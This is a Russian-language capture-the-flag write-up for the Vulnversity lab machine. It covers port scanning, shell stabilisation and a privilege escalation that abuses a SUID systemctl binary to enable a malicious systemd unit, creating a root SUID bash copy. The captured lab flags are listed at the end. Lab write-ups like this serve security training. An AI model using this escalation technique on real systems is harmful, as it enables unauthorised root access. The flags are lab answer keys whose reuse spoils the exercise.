# VulnHub - Vulnversity

📅 Дата: 2025-07-01  
🧠 Сложность:  easy
💻 IP-адрес: 10.10.249.11  

---

## 🔍 Сканирование

```bash
export ip=10.10.249.11
export ports=$(sudo nmap -sS -p- $ip | grep -oP "^[0-9]+(?=/tcp\s+open)" | sort -n | paste -sd ",")
sudo nmap -sT -Pn -sV -T4 -A -p $ports $ip -oN scans/nmap.txt
```

🖼️ Nmap скан:

![nmap scan](screenshots/nmap_scan.png)

---

## 🕵️ Enumeration



## 📂 Получение доступа

Стабилизация
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```


## ⚙️ Привилегии

SUID find
```bash
www-data@ip-10-10-249-11:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/mount
/bin/umount
/bin/systemctl
...
```
### /bin/systemctl

**1. Создание временного .service-файла**
```bash
TF=$(mktemp).service
```
 - mktemp создаёт уникальный временный файл (например, /tmp/tmp.ABCD1234).
 - Добавляется .service, чтобы systemd воспринимал его как юнит.

**2. Построчная запись вредоносного юнита systemd**
```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /bin/bash /tmp/root; chmod +xs /tmp/root"
[Install]
WantedBy=multi-user.target' > $TF
```
 - [Service] – секция, определяющая сервис.
  - Type=oneshot – означает, что сервис выполнится один раз и завершится (не демонизируется).
  - ExecStart=... – команда, которая выполнится при старте сервиса. В данном случае:
   - cp /bin/bash /tmp/root – копирует /bin/bash в /tmp/root.
   - chmod +xs /tmp/root – добавляет SUID-бит (+s), чтобы /tmp/root запускался с правами владельца (root).
 - [Install] – секция, указывающая, когда сервис должен запускаться.
  - WantedBy=multi-user.target – сервис будет активирован при загрузке системы в многопользовательском режиме.

**3. Связывание сервиса с systemd**
```bash
systemctl link $TF
```
 - systemctl link создаёт символическую ссылку из /etc/systemd/system/ на временный файл.
 - Теперь systemd "видит" этот сервис и может им управлять.

**4. Активация сервиса (моментальный запуск)**
```bash
systemctl enable --now $TF
```
 - enable – добавляет сервис в автозагрузку (создаёт симлинк в /etc/systemd/system/multi-user.target.wants/).
 - --now – сразу запускает сервис (выполняет ExecStart).

**Что происходит?**
Systemd (работающий от root) выполняет команду:
```bash
/bin/sh -c "cp /bin/bash /tmp/root; chmod +xs /tmp/root"
```
В /tmp/ появляется файл root – это копия /bin/bash с SUID-битом.

**5. Запуск SUID-баша с правами root**
```bash
/tmp/root -p
```
 - **-p** – сохраняет привилегии (иначе bash сбрасывает SUID).


## 🏁 Флаги

- User flag: 8bd7992fbe8a6ad22a63361004cfcedb
- Root flag: a58ff8579f0a9270368d33a9966c7fd5

---

